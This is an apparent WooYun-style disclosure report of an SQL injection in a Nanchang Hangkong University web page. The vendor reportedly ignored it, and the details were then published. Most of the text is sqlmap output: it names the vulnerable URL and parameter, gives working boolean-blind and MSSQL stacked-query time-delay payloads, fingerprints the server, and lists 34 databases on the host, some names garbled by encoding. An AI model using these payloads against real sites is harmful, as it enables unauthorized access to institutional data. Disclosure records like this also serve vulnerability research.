wybug_title: 南昌航空大学某站存在SQL注入漏洞
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2015-12-05：	细节已通知厂商并且等待厂商处理中									2015-12-10：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT  详细说明：  http://xyh.nchu.edu.cn/md.aspx?c=A1&page=3&t=0


sqlmap resumed the following injection point(s) from stored session:---Parameter: c (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: c=A1' AND 2403=2403 AND 'lmui'='lmui&page=3&t=0    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: c=A1';WAITFOR DELAY '0:0:5'--&page=3&t=0---web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008available databases [34]:[*] [㽜㈶㽜扤ݨ작ⶍⵎ썟][*] [㽜攷㽜晤ᡢ兿㽜愷㽜㥤][*] [䒍ꥒⵎ썟兿㽜愷㽜㥤][*] [窂⽧晛抖㽜㈶㽜扤ήꕢൔ][*] [箏ࡔ톑鹛貚ꑛ][*] dbxyh[*] dzb[*] gjjlc[*] hdpt[*] kjcx[*] master[*] mks[*] model[*] msdb[*] MyOnLineExam[*] nchuinfo[*] new_nchk[*] nhjw[*] OTTService[*] poa[*] ReportServer[*] ReportServerTempDB[*] servercn[*] Teach[*] tempdb[*] whzx[*] WPC[*] YJSTeacherSys[*] ὗ艹晛抖[*] ㅧཛྷ鵛䭭햋[*] 蝥핬晛抖[*] 꽳ᙓ鹛貚ⵎ썟[*] 콾ꅻ晛抖핫ᩎήꅻٴﭼ㽜攷㽜晤[*] 텓啜쒉ቒљ
